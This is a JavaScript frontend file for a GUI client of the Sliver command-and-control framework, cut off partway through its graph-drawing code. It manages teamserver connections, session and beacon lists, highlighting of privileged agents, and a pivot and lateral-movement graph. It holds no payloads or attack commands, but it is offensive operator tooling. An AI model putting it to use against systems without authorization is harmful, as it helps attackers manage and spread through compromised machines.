const App = () => window.go.main.App;
let selectedConfigPath = null, pollTimer = null, activeCtxAgent = null;
let lastConfigPath = null, reconnectTimer = null, reconnecting = false;
let teamserverLabel = 'teamserver';
let allSessions = [], allBeacons = [];
let agentListFilter = 'sessions';
let pivotTree = [];                  // pivot topology from GetPivotGraph RPC
// Graph interaction state (persists across refreshes).
const graphPos = {};                 // agent id -> {x,y} in graph coords
const graphDrag = {};                // agent id -> {x,y} dragged position override
let graphEdges = [];                 // current edge list [{from,to}] for live drag redraws
let graphView = { tx: 0, ty: 0, scale: 1 };
let graphCenter = null;
const openTabs = {};
const eventLog = [];
const EVENT_MAX = 500;
const notesMap = {};          // agent id -> operator notes (in-memory, cleared on disconnect)
const integrityMap = {};      // agent id -> real integrity level from getprivs (System/High/Medium/Low)
let activeInteractId = null;  // currently focused agent tab
const taskStore = TaskStore.createTaskStore({ limit: 100 });
let taskCenterFilter = 'all';
const taskActions = new Map();
const beaconPolls = new Map();
const NOTIFICATION_SETTINGS_KEY = 'sliver-gui:notifications';
const defaultNotificationSettings = {
  enabled: true, desktop: false, minimumLevel: 'info', quietStart: '', quietEnd: '',
  categories: { agent: true, task: true, listener: true },
};
let notificationSettings = loadNotificationSettings();
let listenerSnapshot = null;
const taskNotificationStates = new Map();

function loadNotificationSettings() {
  try {
    const saved = JSON.parse(localStorage.getItem(NOTIFICATION_SETTINGS_KEY) || '{}');
    return { ...defaultNotificationSettings, ...saved, categories: { ...defaultNotificationSettings.categories, ...(saved.categories || {}) } };
  } catch (error) { return { ...defaultNotificationSettings, categories: { ...defaultNotificationSettings.categories } }; }
}
function saveNotificationSettings() {
  try { localStorage.setItem(NOTIFICATION_SETTINGS_KEY, JSON.stringify(notificationSettings)); } catch (error) {}
}
function notifyOperational(event) {
  if (!NotificationRules.shouldNotify(event, notificationSettings)) return;
  const toastType = event.level === 'critical' ? 'err' : event.level === 'warning' ? 'info' : 'ok';
  toast(toastType, event.message, event.level === 'critical' ? 6000 : 3500);
  if (notificationSettings.desktop && 'Notification' in window && Notification.permission === 'granted') {
    new Notification(event.title || 'Sliver GUI', { body: event.message, tag: event.tag || event.category });
  }
}

// ── Persistence ─────────────────────────────────────────────────────────────
// Operator notes, measured integrity, and graph layout survive disconnects and
// app restarts, scoped per teamserver, in localStorage. (Previously in-memory
// only, so they were lost on every reconnect.)
let persistKey = null;        // set once we know which teamserver we're on
let saveTimer = null;
function persistScope(teamserver) { persistKey = 'sliver-gui:' + (teamserver || 'default'); }
function saveState() {
  if (!persistKey) return;
  clearTimeout(saveTimer);
  saveTimer = setTimeout(() => {
    try {
      localStorage.setItem(persistKey, JSON.stringify({
        notes: notesMap, integrity: integrityMap, graph: graphPos,
        workspace: Object.fromEntries(Object.entries(openTabs).filter(([, value]) => value.obj).map(([id, value]) => [id, value.workspaceView || 'terminal'])),
        v: 2,
      }));
    } catch (e) { /* quota/private-mode: state stays in-memory only */ }
  }, 300);
}
function loadState() {
  if (!persistKey) return;
  let data;
  try { data = JSON.parse(localStorage.getItem(persistKey) || '{}'); } catch (e) { return; }
  if (!data || typeof data !== 'object') return;
  Object.assign(notesMap, data.notes || {});
  Object.assign(integrityMap, data.integrity || {});
  Object.assign(graphPos, data.graph || {});
  window.savedWorkspaceViews = data.workspace || {};
}

// ── Utils ──────────────────────────────────────────────────────────────────
function esc(s) { return s == null ? '' : String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function toast(type, msg, dur=3000) {
  if (type === 'error') type = 'err';
  const t = document.createElement('div'); t.className = `toast ${type}`; t.textContent = msg;
  document.getElementById('toasts').appendChild(t);
  setTimeout(() => t.remove(), dur);
}
function rpcError(error, context = '') { return RpcErrors.normalizeRpcError(error, context); }
function rpcErrorMessage(error, context = '') { return RpcErrors.rpcErrorMessage(error, context); }
function rpcErrorHtml(error, context = '') {
  const info = rpcError(error, context);
  return `<div class="rpc-error"><strong>${esc(info.message)}</strong>${info.detail ? `<details><summary>查看原始错误</summary><code>${esc(info.detail)}</code></details>` : ''}</div>`;
}
function toastRpcError(error, context = '') {
  const info = rpcError(error, context);
  if (!info.cancelled) toast('err', info.message, 5000);
  return info;
}

// uiConfirm / uiPrompt — in-app replacements for the browser's native
// confirm()/prompt(). Wails' macOS WebView (WKWebView) does not implement the
// JS dialog panels, so native confirm() returns false and prompt() returns null
// without ever showing a dialog — silently killing any action guarded by them
// (Kill agent, Delete build, Rename session). These are pure-DOM and work on
// every platform. Both return a Promise.
function uiDialog({ title, message, input, placeholder, okLabel = '确定', danger = false }) {
  return new Promise(resolve => {
    const ov = document.createElement('div');
    ov.style.cssText = 'position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.5)';
    const inputHtml = input
      ? `<input id="ui-dlg-input" type="text" value="${(placeholder || '').replace(/"/g, '&quot;')}" style="width:100%;box-sizing:border-box;margin-top:10px;padding:7px 9px;background:var(--bg);color:var(--fg);border:1px solid var(--border);border-radius:5px;font-size:13px">`
      : '';
    ov.innerHTML = `<div style="min-width:300px;max-width:440px;background:var(--panel,var(--bg));border:1px solid var(--border);border-radius:8px;padding:18px 18px 14px;box-shadow:0 8px 30px rgba(0,0,0,.4)">
      ${title ? `<div style="font-weight:600;font-size:13.5px;margin-bottom:6px">${title}</div>` : ''}
      <div style="font-size:13px;color:var(--muted)">${message}</div>${inputHtml}
      <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:16px">
        <button id="ui-dlg-cancel" class="btn small">取消</button>
        <button id="ui-dlg-ok" class="btn small${danger ? ' danger' : ''}">${okLabel}</button>
      </div></div>`;
    document.body.appendChild(ov);
    const inp = ov.querySelector('#ui-dlg-input');
    if (inp) { inp.focus(); inp.select(); }
    const done = val => { ov.remove(); document.removeEventListener('keydown', onKey); resolve(val); };
    const onOk = () => done(input ? (inp.value || '') : true);
    const onCancel = () => done(input ? null : false);
    function onKey(e) {
      if (e.key === 'Escape') onCancel();
      else if (e.key === 'Enter') onOk();
    }
    ov.querySelector('#ui-dlg-ok').addEventListener('click', onOk);
    ov.querySelector('#ui-dlg-cancel').addEventListener('click', onCancel);
    ov.addEventListener('click', e => { if (e.target === ov) onCancel(); });
    document.addEventListener('keydown', onKey);
  });
}
function uiConfirm(message, opts = {}) { return uiDialog({ message, ...opts }); }
function uiPrompt(message, defaultValue = '', opts = {}) { return uiDialog({ message, input: true, placeholder: defaultValue, okLabel: '确定', ...opts }); }
function uiSelectDialog(message, options, opts = {}) {
  return new Promise(resolve => {
    const ov = document.createElement('div'); ov.className = 'ui-dialog-overlay';
    ov.innerHTML = `<div class="ui-dialog"><div class="ui-dialog-title">${esc(opts.title || '')}</div><div class="ui-dialog-message">${esc(message)}</div><select class="ui-dialog-select">${options.map(option => `<option value="${esc(option.value)}">${esc(option.label)}</option>`).join('')}</select><div class="ui-dialog-actions"><button class="btn small" data-dialog-cancel>取消</button><button class="btn small accent" data-dialog-ok>${esc(opts.okLabel || '确定')}</button></div></div>`;
    document.body.appendChild(ov);
    const select = ov.querySelector('select'); select.focus();
    const done = value => { ov.remove(); document.removeEventListener('keydown', onKey); resolve(value); };
    const onKey = event => { if (event.key === 'Escape') done(null); else if (event.key === 'Enter') done(select.value); };
    ov.querySelector('[data-dialog-cancel]').addEventListener('click', () => done(null));
    ov.querySelector('[data-dialog-ok]').addEventListener('click', () => done(select.value));
    ov.addEventListener('click', event => { if (event.target === ov) done(null); });
    document.addEventListener('keydown', onKey);
  });
}

async function runDangerousAction({ title, message, okLabel, action, success, refresh }) {
  const confirmed = await uiConfirm(message, { title, okLabel, danger: true });
  if (!confirmed) return false;
  const error = await action().then(() => null).catch(error => error);
  if (error) {
    toastRpcError(error, `${title}失败`);
    return false;
  }
  if (success) toast('ok', success);
  if (refresh) await refresh();
  return true;
}

function isPrivileged(obj) {
  // If we've actually queried integrity for this agent, trust that over the guess.
  const lvl = (integrityMap[obj.id] || '').toLowerCase();
  if (lvl) return lvl.includes('system') || lvl.includes('high');
  const u = (obj.username || '').trim().toLowerCase();
  if (!u) return false;
  // Fallback heuristic: machine account (HOST$) = SYSTEM; NT AUTHORITY\*/admin/root.
  if (u.endsWith('$')) return true;
  return ['nt authority', 'system', 'administrator', 'admin', 'root'].some(k => u.includes(k));
}
// integrityLabel returns a short label for a node when its integrity is known.
function integrityLabel(obj) {
  const lvl = integrityMap[obj.id];
  if (!lvl) return '';
  if ((obj.username || '').trim().endsWith('$') || (obj.username || '').toLowerCase().includes('system')) return 'SYSTEM';
  return lvl.toUpperCase();
}
function osLabel(os) {
  const o = (os||'').toLowerCase();
  if (o.includes('windows')) return 'W';
  if (o.includes('linux')) return 'L';
  if (o.includes('darwin')) return 'M';
  return '?';
}
// osIconHref returns the PNG icon path for an OS + privilege level (icons live in
// frontend/dist/icons). HIGH = privileged, NORMAL = user. Falls back to Windows.
function osIconHref(os, priv, dead) {
  const o = (os||'').toLowerCase();
  const lvl = dead ? 'DEAD' : (priv ? 'HIGH' : 'NORMAL');   // DEAD > HIGH > NORMAL
  if (o.includes('linux')) return `./icons/LINUX-${lvl}.png`;
  // macOS / container / unknown — no dedicated icon; use the Windows art.
  return `./icons/WIN-${lvl}.png`;
}
// shortUser strips a leading DOMAIN\ or HOST\ from a Windows username.
function shortUser(u) { u = u || '?'; const i = u.lastIndexOf('\\'); return i >= 0 ? u.slice(i+1) : u; }
// fmtDur renders a sliver interval/jitter (nanoseconds) as seconds.
function fmtDur(ns) { const n = Number(ns) || 0; return n > 1e6 ? `${Math.round(n/1e9)}s` : `${n}s`; }

// ── Connect ────────────────────────────────────────────────────────────────
const LAST_CFG_KEY = 'sliver-gui:lastConfig';

// selectConfig marks a config path as the one to connect with: fills the label,
// enables the Connect button, and highlights the matching saved-config row.
function selectConfig(path) {
  selectedConfigPath = path;
  document.getElementById('config-path').textContent = path || '';
  document.getElementById('connect-btn').disabled = !path;
  document.querySelectorAll('#saved-configs .cfg-row').forEach(el => {
    el.classList.toggle('selected', el.dataset.path === path);
  });
}

// renderSavedConfigs pulls the discovered .cfg list from the backend
// (~/.sliver-gui/configs + ~/.sliver-client/configs) so the operator can pick a
// teamserver without re-selecting a file every launch (issue #4).
async function renderSavedConfigs() {
  const box = document.getElementById('saved-configs');
  if (!box) return;
  let list = [];
  try { list = await App().ListSavedConfigs(); } catch (e) { list = []; }
  box.innerHTML = '';
  if (!list || !list.length) { box.classList.add('hidden'); return; }
  box.classList.remove('hidden');
  const last = localStorage.getItem(LAST_CFG_KEY);
  list.forEach(c => {
    const row = document.createElement('div');
    row.className = 'cfg-row';
    row.dataset.path = c.path;
    const meta = document.createElement('div'); meta.className = 'cfg-meta';
    meta.innerHTML = `<span class="cfg-name">${c.operator || c.name || '(config)'}</span>` +
                     `<span class="cfg-server">${c.teamserver || c.path}</span>`;
    row.appendChild(meta);
    // Remove control — only for app-managed configs (never the sliver-client dir).
    if (c.managed) {
      const del = document.createElement('button');
      del.className = 'cfg-del'; del.textContent = '✕'; del.title = '从列表移除';
      del.addEventListener('click', async (ev) => {
        ev.stopPropagation();
        try { await App().RemoveSavedConfig(c.path); } catch (e) {}
        if (selectedConfigPath === c.path) selectConfig(null);
        renderSavedConfigs();
      });
      row.appendChild(del);
    }
    row.addEventListener('click', () => selectConfig(c.path));
    row.addEventListener('dblclick', () => { selectConfig(c.path); document.getElementById('connect-btn').click(); });
    box.appendChild(row);
    if (c.path === last) selectConfig(c.path); // pre-select last used → one-click connect
  });
}

async function importOperatorConfig(path) {
  path = String(path || '').trim().replace(/^(["'])(.*)\1$/, '$2');
  if (!path) return;
  const errorEl = document.getElementById('connect-error');
  errorEl.textContent = '';
  try {
    const saved = await App().ImportConfig(path);
    await renderSavedConfigs();
    selectConfig(saved.path);
    document.getElementById('manual-cfg-path').value = '';
    toast('ok', `已添加操作员配置：${saved.name || saved.operator || path}`);
  } catch (e) {
    errorEl.textContent = rpcErrorMessage(e, '配置导入失败');
  }
}

document.getElementById('pick-config-btn').addEventListener('click', async () => {
  const path = await App().PickConfigFile().catch(e => {
    const info = rpcError(e, '打开文件选择器失败');
    if (!info.cancelled) document.getElementById('connect-error').textContent = info.message;
    return null;
  });
  await importOperatorConfig(path);
});
document.getElementById('manual-cfg-path').addEventListener('input', function() {
  const p = this.value.trim().replace(/^(["'])(.*)\1$/, '$2');
  if (p) selectConfig(p);
});
document.getElementById('manual-cfg-path').addEventListener('keydown', function(e) {
  if (e.key === 'Enter') { e.preventDefault(); importOperatorConfig(this.value); }
});
document.getElementById('connect-btn').addEventListener('click', async () => {
  const btn = document.getElementById('connect-btn');
  btn.disabled = true; btn.textContent = '正在连接...';
  const r = await App().Connect(selectedConfigPath).catch(error => ({ error }));
  if (r.error) { document.getElementById('connect-error').textContent = rpcErrorMessage(r.error, '连接失败'); btn.disabled = false; btn.textContent = '连接'; return; }
  lastConfigPath = selectedConfigPath;
  try { localStorage.setItem(LAST_CFG_KEY, selectedConfigPath); } catch (e) {}
  enterApp(r);
});
// Populate the saved-config list as soon as the Wails runtime is ready.
renderSavedConfigs();

async function enterApp(info) {
  document.getElementById('connect-overlay').classList.add('hidden');
  document.getElementById('app-shell').classList.remove('hidden');
  document.getElementById('operator-tag').textContent = `${info.operatorName}@${info.teamserver}`;
  teamserverLabel = info.teamserver || 'teamserver';
  persistScope(teamserverLabel);
  loadState();
  const ver = await App().GetVersion().catch(() => null);
  if (ver) document.getElementById('server-version').textContent = `v${ver.major}.${ver.minor}.${ver.patch}`;
  wireEventStream();
  pinServerConsole();     // Server console docked by default
  pinEvents();            // Event Log docked in the console by default
  pinScripts();           // Script Manager docked in the console by default
  refreshAgents();
  pollTimer = setInterval(refreshAgents, 5000);
}

document.getElementById('disconnect-btn').addEventListener('click', async () => {
  clearInterval(pollTimer);
  if (window.runtime) { window.runtime.EventsOff('sliver:event'); window.runtime.EventsOff('sliver:disconnected'); }
  await App().Disconnect();
  document.getElementById('app-shell').classList.add('hidden');
  document.getElementById('connect-overlay').classList.remove('hidden');
  document.getElementById('connect-btn').textContent = '连接'; document.getElementById('connect-btn').disabled = true;
  document.getElementById('config-path').textContent = '';
  document.getElementById('interact-tabs').innerHTML = '';
  document.getElementById('interact-panels').innerHTML = '<div class="empty-interact" id="empty-interact"><p>双击代理开始交互。</p></div>';
  for (const k in openTabs) delete openTabs[k];
  for (const k in notesMap) delete notesMap[k];
  for (const k in integrityMap) delete integrityMap[k];
  // Clear transient graph state so jump lineage / drags don't leak into the next
  // engagement (persisted per-teamserver graphPos is kept).
  for (const k in jumpParentMap) delete jumpParentMap[k];
  for (const k in graphDrag) delete graphDrag[k];
  pivotTree = [];
  activeInteractId = null;
  allSessions = []; allBeacons = [];
  listenerSnapshot = null;
  selectedConfigPath = null; cancelReconnect();
});

// ── Event Stream ───────────────────────────────────────────────────────────
function wireEventStream() {
  if (!window.runtime) return;
  window.runtime.EventsOff('sliver:event'); window.runtime.EventsOff('sliver:disconnected');
  window.runtime.EventsOn('sliver:disconnected', (reason) => onDisconnected(reason));
  window.runtime.EventsOn('sliver:event', (ev) => {
    logEvent(ev);
    if (ev.type && ev.type.includes('session')) refreshAgents();
    if (ev.type && ev.type.includes('beacon')) refreshAgents();
    if (ev.type === 'session-connected' || ev.type === 'session-opened') notifyOperational({ category:'agent', level:'info', title:'Session 上线', message:`新会话：${ev.session?.hostname||'未知主机'}`, tag:'session-online' });
    if (ev.type === 'beacon-registered') notifyOperational({ category:'agent', level:'info', title:'Beacon 上线', message:`信标已注册：${ev.session?.hostname||'未知主机'}`, tag:'beacon-online' });
  });
}
function logEvent(ev) {
  eventLog.unshift({ time: new Date().toLocaleTimeString(), type: ev.type||'unknown', detail: ev.session ? `${ev.session.hostname} (${ev.session.os}) ${ev.session.username||''}` : (ev.data||'') });
  if (eventLog.length > EVENT_MAX) eventLog.length = EVENT_MAX;
  renderEventsList(); // live-update any open/pinned event views
}
function eventColor(type) {
  const t = type || '';
  if (t.includes('session')) return 'var(--ok)';
  if (t.includes('beacon')) return 'var(--info)';
  if (t.includes('job')) return 'var(--warn)';
  if (t.includes('operator')) return 'var(--accent)';
  return 'var(--muted)';
}
function renderEventsList() {
  const targets = document.querySelectorAll('[data-events-list]');
  if (!targets.length) return;
  const rows = eventLog.length
    ? eventLog.map(e => `<div class="event-entry"><span class="event-time">${esc(e.time)}</span><span class="event-type" style="color:${eventColor(e.type)};font-weight:bold">${esc(e.type)}</span><span class="event-detail">${esc(e.detail)}</span></div>`).join('')
    : '<div style="padding:10px;color:var(--muted)">暂无事件。</div>';
  targets.forEach(el => el.innerHTML = rows);
}

// ── Refresh all agents ─────────────────────────────────────────────────────
async function refreshAgents() {
  allSessions = await App().ListSessions().catch(() => []) || [];
  allBeacons = await App().ListBeacons().catch(() => []) || [];
  pivotTree = await App().GetPivotGraph().catch(() => []) || [];
  updateAgentCount();
  renderTable();
  refreshOpenAgentHeaders();
  if (!document.getElementById('graph-view').classList.contains('hidden')) renderGraph();
  refreshListenerHealth();
}
function visibleAgents() {
  if (agentListFilter === 'beacons') return allBeacons.map(obj => ({ kind:'beacon', obj }));
  return allSessions.map(obj => ({ kind:'session', obj }));
}
function updateAgentCount() {
  const count = agentListFilter === 'beacons' ? allBeacons.length : allSessions.length;
  document.getElementById('agent-count').textContent = `${count} 个${agentListFilter === 'beacons' ? '信标' : '会话'}`;
}
function selectAgentList(view) {
  agentListFilter = view === 'beacons' ? 'beacons' : 'sessions';
  updateAgentCount();
  renderTable();
  if (!document.getElementById('graph-view').classList.contains('hidden')) renderGraph();
}

async function refreshListenerHealth() {
  const jobs = await App().ListJobs().catch(() => null);
  if (!jobs) return;
  const current = new Map(jobs.map(job => [String(job.id), job]));
  if (listenerSnapshot) {
    for (const [id, previous] of listenerSnapshot) {
      if (!current.has(id)) notifyOperational({ category:'listener', level:'warning', title:'Listener 状态变化', message:`客户端观察到监听器 ${previous.name || '#' + id} 已不在活动列表中`, tag:`listener-${id}` });
    }
  }
  listenerSnapshot = current;
}
function refreshOpenAgentHeaders() {
  for (const [id, tab] of Object.entries(openTabs)) {
    if (!tab.obj) continue;
    const latest = (tab.kind === 'session' ? allSessions : allBeacons).find(item => item.id === id);
    if (!latest) continue;
    tab.obj = latest;
    const panel = document.getElementById(`ip-${id}`);
    panel?.querySelector('.agent-live-dot')?.classList.toggle('dead', Boolean(latest.isDead));
    const state = panel?.querySelector('.agent-workspace-state');
    if (state) state.textContent = tab.kind === 'beacon'
      ? `异步信标 · 上次签到 ${latest.lastCheckin || '-'} · 下次预计 ${latest.nextCheckin || '-'} · ${fmtDur(latest.interval)} ± ${fmtDur(latest.jitter)}`
      : `${latest.isDead ? '已失联' : '实时会话'} · 最近活动 ${latest.lastCheckin || '-'} · PID ${latest.pid || '-'}`;
  }
}
document.getElementById('refresh-all-btn').addEventListener('click', refreshAgents);

// ── Table view ─────────────────────────────────────────────────────────────
// userCell renders the user column, highlighting privileged (SYSTEM/admin/★) agents.
function userCell(o) {
  const il = integrityLabel(o);
  return isPrivileged(o)
    ? `<td class="user-priv" title="高权限（右键检查完整性级别以获取实际级别）">★ ${esc(o.username)}${il ? ` [${il}]` : ''}</td>`
    : `<td>${esc(o.username)}${il ? ` <span style="color:var(--muted)">[${il}]</span>` : ''}</td>`;
}
function renderTable() {
  const body = document.getElementById('agents-body');
  body.innerHTML = '';
  const row = (o, kind) => {
    const tr = document.createElement('tr'); tr.dataset.id = o.id; tr.dataset.kind = kind;
    if (isPrivileged(o) && !o.isDead) tr.classList.add('row-priv');
    const typeCls = kind === 'session' ? 'type-session' : 'type-beacon';
    const remoteIP = RemoteAddress.sourceIP(o.remoteAddress);
    const process = o.processName ? `<small class="agent-process-name" title="${esc(o.processName)}">${esc(o.processName)}</small>` : '';
    tr.innerHTML = `<td class="${typeCls}">${kind === 'session' ? '会话' : '信标'}</td><td>${esc(o.name||o.id.slice(0,8))}</td><td>${esc(o.hostname)}</td>${userCell(o)}<td title="${esc(o.remoteAddress || 'Teamserver 未提供连接来源')}">${esc(remoteIP)}</td><td>${esc(o.os)}/${esc(o.arch)}</td><td><span>${o.pid}</span>${process}</td><td>${esc(o.transport)}</td><td>${esc(o.lastCheckin)}</td><td class="${o.isDead?'status-dead':'status-alive'}">${o.isDead?'离线':'在线'}</td>`;
    tr.addEventListener('dblclick', () => openInteract(kind, o));
    tr.addEventListener('contextmenu', e => showCtx(e, kind, o));
    body.appendChild(tr);
  };
  const agents = visibleAgents();
  agents.forEach(agent => row(agent.obj, agent.kind));
  if (!agents.length) {
    body.innerHTML = `<tr><td colspan="10" class="empty-state">暂无${agentListFilter === 'beacons' ? '信标' : '会话'}</td></tr>`;
  }
}

// ── View toggle ────────────────────────────────────────────────────────────
document.getElementById('view-table-btn').addEventListener('click', () => { document.getElementById('table-view').classList.remove('hidden'); document.getElementById('graph-view').classList.add('hidden'); document.getElementById('view-table-btn').classList.add('active'); document.getElementById('view-graph-btn').classList.remove('active'); });
document.getElementById('view-graph-btn').addEventListener('click', () => { document.getElementById('table-view').classList.add('hidden'); document.getElementById('graph-view').classList.remove('hidden'); document.getElementById('view-table-btn').classList.remove('active'); document.getElementById('view-graph-btn').classList.add('active'); renderGraph(); });
document.getElementById('graph-reset-btn').addEventListener('click', resetGraph);

// ── Graph view (premium Cobalt-Strike style) ────────────────────────────────
// jumpParentMap tracks Jump / Spawn operations performed from session console or script manager
// Format: jumpParentMap[targetHostOrIP] = { parentID, parentHost }
const jumpParentMap = {};

function recordJump(parentSessID, targetHost) {
  if (!targetHost || !parentSessID) return;
  const parentTab = openTabs[parentSessID];
  const parentHost = (parentTab && parentTab.obj && parentTab.obj.hostname) ? parentTab.obj.hostname : '';
  const record = { parentID: parentSessID, parentHost: parentHost };
  jumpParentMap[targetHost] = record;
  const cleanHost = targetHost.startsWith('[')
    ? targetHost.substring(1, targetHost.indexOf(']'))
    : targetHost.split(':')[0];
  if (cleanHost && cleanHost !== targetHost) {
    jumpParentMap[cleanHost] = record;
  }
}

// buildPivotMaps flattens Sliver's pivot tree into sessionID/hostname -> parent mappings.
// Prefers sessionID-based matching to correctly handle multiple sessions on the same host.
function buildPivotMaps() {
  const parentOf   = {};  // hostname -> parent hostname
  const parentOfID = {};  // sessionID -> parent sessionID
  const walk = (nd, parentHost, parentSessID) => {
    const host   = nd.hostname || nd.name || ('peer' + nd.peerId);
    // JSON tag is "sessionId" (lowercase d) — reading nd.sessionID left this
    // undefined, breaking the reliable per-session pivot matching and forcing a
    // wrong hostname fallback (e.g. a pivot child attached to the root instead
    // of its real parent).
    const sessID = nd.sessionId || nd.sessionID || nd.id || null;
    if (parentHost)              parentOf[host]     = parentHost;
    if (sessID && parentSessID)  parentOfID[sessID] = parentSessID;
    (nd.children || []).forEach(c => walk(c, host, sessID));
  };
  (pivotTree || []).forEach(r => walk(r, null, null));
  return { parentOf, parentOfID };
}

// edgeD builds a straight edge path shortened at both ends so the arrowhead sits
// on the target node's edge (not under its icon). srcR/tgtR are the radii to inset.
function edgeD(src, tgt, srcR, tgtR) {
  const dx = tgt.x - src.x, dy = tgt.y - src.y, len = Math.hypot(dx, dy) || 1;
  const ux = dx / len, uy = dy / len;
  const ax = src.x + ux * srcR, ay = src.y + uy * srcR;
  const bx = tgt.x - ux * tgtR, by = tgt.y - uy * tgtR;
  return `M${ax.toFixed(1)} ${ay.toFixed(1)} L${bx.toFixed(1)} ${by.toFixed(1)}`;
}

// edgeColor picks the line colour from the agent it points at.
// Jump edges are orange and handled separately in renderGraph.
function edgeColor(nd) {
  if (!nd) return '#35c46b';
  if (nd.obj && nd.obj.isDead) return '#6b7280';      // dead → grey (matches legend)
  if (nd.kind === 'beacon') return '#4d9fe6';
  return isPrivileged(nd.obj) ? '#e23c4e' : '#35c46b';
}

// renderGraph draws the pivot topology: firewall on left, coloured egress/pivot edges,
// and orange bidirectional dashed lines for lateral-movement jumps.
function renderGraph() {
  const svg = document.getElementById('graph-svg');
  if (!svg) return;
  try {
    const nodes = visibleAgents();
    const W = svg.clientWidth || 900, H = svg.clientHeight || 460;
    svg.setAttribute('viewBox', `0 0 ${W} ${H}`);
    const fwX = 74, fwY = H / 2;

    // Build lookup maps
    const nodeByHost = {}, nodeByID = {};
    nodes.forEach(nd => {
      const h = nd.obj.hostname; if (h && !nodeByHost[h]) nodeByHost[h] = nd;
      nodeByID[nd.obj.id] = nd;
    });

    const { parentOf, parentOfID } = buildPivotMaps();
    const parentNodeId = {}, jumpEdgeSet = new Set();

    // ── Parent resolution — PIVOT is authoritative, JUMP is heuristic. ──
    // Pass 1: pivot parents from Sliver's pivot graph (session-ID; then a GENUINE
    // cross-host hostname fallback). These come straight from the teamserver and
    // define the true topology (firewall → gateway → pivoted agent).
    nodes.forEach(nd => {
      let parentId = null;
      const pByID = parentOfID[nd.obj.id];
      if (pByID && nodeByID[pByID] && pByID !== nd.obj.id) parentId = pByID;
      if (!parentId) {
        const ph = parentOf[nd.obj.hostname];
        if (ph && ph !== nd.obj.hostname) {
          const cands = nodes.filter(n => n.obj.hostname === ph && n.obj.id !== nd.obj.id);
          if (cands.length) parentId = cands[0].obj.id;
        }
      }
      if (parentId) parentNodeId[nd.obj.id] = parentId;
    });

    // wouldCycle: does linking child→parent loop back through the existing parents?
    const wouldCycle = (childId, parentId) => {
      let cur = parentId, hops = 0;
      while (cur && hops++ <= nodes.length) { if (cur === childId) return true; cur = parentNodeId[cur]; }
      return false;
    };

    // Pass 2: jump / lateral-move lineage — ONLY for agents that have no pivot
    // parent, and NEVER if it would reverse/cycle a pivot chain. This is what
    // stops a jump whose target IP collides with an existing same-host session
    // (all agents on one box share an IP) from hijacking or flipping the tree.
    nodes.forEach(nd => {
      if (parentNodeId[nd.obj.id]) return;              // pivot already owns this node
      let ipOnly = '';
      if (nd.obj.remoteAddress) {
        const raw = nd.obj.remoteAddress;
        ipOnly = raw.startsWith('[') ? raw.substring(1, raw.indexOf(']')) : raw.split(':')[0];
      }
      const entry = jumpParentMap[nd.obj.hostname] ||
                    (ipOnly ? jumpParentMap[ipOnly] : null) ||
                    jumpParentMap[nd.obj.remoteAddress];
      if (!entry) return;
      const pID   = (typeof entry === 'object') ? entry.parentID   : entry;
      const pHost = (typeof entry === 'object') ? entry.parentHost : null;
      let parentId = null;
      if (pID && pID !== nd.obj.id && nodeByID[pID] && !nodeByID[pID].obj.isDead) parentId = pID;
      else if (pHost && pHost !== nd.obj.hostname) {
        const ap = nodes.filter(n => n.obj.hostname === pHost && n.obj.id !== nd.obj.id && !n.obj.isDead);
        if (ap.length) parentId = ap[0].obj.id;
      }
      if (parentId && !wouldCycle(nd.obj.id, parentId)) {
        parentNodeId[nd.obj.id] = parentId;
        jumpEdgeSet.add(`${parentId}:${nd.obj.id}`);
      }
    });

    // Safety net: drop self-parents / parents that aren't real nodes.
    nodes.forEach(nd => {
      const p = parentNodeId[nd.obj.id];
      if (p === nd.obj.id || (p && !nodeByID[p])) delete parentNodeId[nd.obj.id];
    });

    // Rebuild the children map from the validated parent links.
    const kidsOf = {};
    nodes.forEach(nd => {
      const p = parentNodeId[nd.obj.id];
      if (p) (kidsOf[p] = kidsOf[p] || []).push(nd.obj.id);
    });
    const roots = nodes.filter(nd => !parentNodeId[nd.obj.id]).map(nd => nd.obj.id);
    const downstreamCount = id => (kidsOf[id] || []).reduce((total, child) => total + 1 + downstreamCount(child), 0);
    const affectedByOfflineParent = id => {
      let parent = parentNodeId[id], hops = 0;
      while (parent && hops++ <= nodes.length) {
        if (nodeByID[parent]?.obj?.isDead) return true;
        parent = parentNodeId[parent];
      }
      return false;
    };

    // Tidy left-to-right tree: x = depth column, y = leaf order (parents centred
    // on the span of their children). rowH > node height so labels never overlap.
    const layout = {}, colW = 200, rowH = 116, topPad = 50;
    let row = 0;
    const placed = {};
    const place = (id, depth) => {
      if (placed[id]) return layout[id] ? layout[id].y : topPad + row * rowH;
      placed[id] = 1;
      const x = fwX + depth * colW;
      const kids = (kidsOf[id] || []).filter(k => !placed[k]);
      let y;
      if (!kids.length) { y = topPad + row * rowH; row++; }
      else { const ys = kids.map(k => place(k, depth + 1)); y = (Math.min(...ys) + Math.max(...ys)) / 2; }
      layout[id] = { x, y };
      return y;
    };
    roots.forEach(r => place(r, 1));
    nodes.forEach(nd => { if (!placed[nd.obj.id]) place(nd.obj.id, 1); });

    // Vertically centre the whole tree in the viewport.
    const yvals = Object.values(layout).map(p => p.y);
    if (yvals.length) {
      const mid = (Math.min(...yvals) + Math.max(...yvals)) / 2;
      const dy = H / 2 - mid;
      Object.values(layout).forEach(p => p.y += dy);
    }
    svg._layout = layout; svg._fwX = fwX; svg._fwY = fwY;
    // Priority: live drag > persisted position > computed layout.
    const posOf  = id => graphDrag[id] || graphPos[id] || layout[id] || { x: fwX + colW, y: H / 2 };
    // Icon half-width is 26px; inset the arrows well past it on BOTH ends so
    // every edge has the same clear, tidy gap before the node/firewall icon.
    const NODE_R = 46, FW_R = 48;

    // Build edge list — firewall → every root, then parent → child.
    graphEdges = [];
    roots.forEach(id => graphEdges.push({ from:'__fw__', to:id, isJump:false }));
    nodes.forEach(nd => {
      const p = parentNodeId[nd.obj.id];
      if (p) graphEdges.push({ from:p, to:nd.obj.id, isJump: jumpEdgeSet.has(`${p}:${nd.obj.id}`) });
    });

    const fwPos = { x: fwX, y: fwY };

    // SVG defs — arrowheads for green/red/blue/orange
    let html = '<defs>' +
      '<marker id="ar-green"        viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#35c46b"/></marker>' +
